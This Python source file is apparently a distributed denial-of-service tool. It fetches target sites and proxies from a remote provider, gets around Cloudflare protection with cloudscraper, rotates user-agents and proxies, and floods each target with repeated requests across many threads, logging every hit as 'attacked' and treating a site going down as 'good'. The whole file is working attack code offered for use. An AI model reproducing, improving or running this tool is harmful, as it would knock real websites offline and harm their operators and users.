import os
import random

from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor
from gc import collect
from sys import stderr
from threading import Thread
from time import sleep
from random import choice

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings

from atomic_counter import AtomicCounter
last_count = 0

import settings
from RemoteProvider import RemoteProvider

disable_warnings()

parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

remoteProvider = RemoteProvider(args.targets)
threads = int(args.threads)

submitted_tasks = []
executor = ThreadPoolExecutor(max_workers=threads * 2)
counter = AtomicCounter()

logger.remove()
logger.add(
    args.logger_output,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(
    args.logger_results,
    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
        <cyan>{line}</cyan> - <white>{message}</white>",
    level="SUCCESS")


def check_req():
    os.system("python3 -m pip install -r requirements.txt")
    os.system("python -m pip install -r requirements.txt")
    os.system("pip install -r requirements.txt")
    os.system("pip3 install -r requirements.txt")


def mainth(site: str):
    scraper = cloudscraper.create_scraper(
        browser=settings.BROWSER, )
    scraper.headers.update(
        {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
         'Connection': 'keep-alive',
         'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
         'Accept-Encoding': 'gzip, deflate, br'})

    count_attacks_for_current_site = 0

    try:
        attack = scraper.get(site, timeout=settings.READ_TIMEOUT)

        if attack.status_code >= 302:
            # use 10 random proxies from a list
            sampled_proxies = random.sample(remoteProvider.get_proxies(), 10)
            for proxy in sampled_proxies:
                if count_attacks_for_current_site >= settings.MAX_REQUESTS_TO_SITE:
                    return

                scraper.proxies.update({
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                })

                response = scraper.get(site, timeout=10)
                if 200 <= response.status_code <= 302:
                    while count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE:
                        response = scraper.get(site, timeout=10)
                        if response.status_code >= 400:
                            break
                        count_attacks_for_current_site += 1
                        counter.increment()
                        logger.success(f"=^.^= attacked -> {site}")
        else:
            while count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE:
                response = scraper.get(site, timeout=10)
                if response.status_code >= 400:
                    break
                count_attacks_for_current_site += 1
                counter.increment()
                logger.success(f"=^.^= attacked -> {site}")
    except ConnectionError:
        logger.info(f"{site} is not responding. Don't panic: it might be down (this is good!), or proxy/vpn is blocked (this is not good). We cannot know for sure, but will try again")
    except Exception as exc:
        logger.warning(f"Error: {exc}")


def cleaner():
    while True:
        collect()
        current_count = counter.value()
        global last_count
        delta = current_count - last_count
        logger.info(f" >>>>> speed: {str(delta)} requests per minute <<<<<")
        last_count = current_count
        sleep(60)

def runningTasksCount():
    r = 0
    for task in submitted_tasks:
        if task.running():
            r += 1
        if task.done():
            submitted_tasks.remove(task)
        if task.cancelled():
            submitted_tasks.remove(task)
    return r

if __name__ == '__main__':
    check_req()
    Thread(target=cleaner, daemon=True).start()
    sites = remoteProvider.get_target_sites()
    # initially start as many tasks as configured threads
    for _ in range(threads):
        submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))

    while True:
        currentRunningCount = runningTasksCount()
        while currentRunningCount < threads:
            submitted_tasks.append(executor.submit(mainth, choice(remoteProvider.get_target_sites())))
            currentRunningCount += 1
        sleep(1)

